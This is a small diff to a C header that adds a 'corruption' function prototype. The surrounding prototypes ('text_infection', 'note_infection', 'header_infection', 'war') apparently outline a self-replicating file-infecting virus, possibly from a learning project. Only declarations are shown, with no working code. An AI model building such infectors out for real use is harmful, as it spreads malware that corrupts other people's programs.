@@ -172,6 +172,7 @@ void war(struct s_host *host, struct s_keychain *keychain, enum e_context contex
 void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context);
 void host_constructor(struct s_host *host, struct s_keychain *keychain, char *filename, enum e_context context);
 void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void corruption(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context contect);
 void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
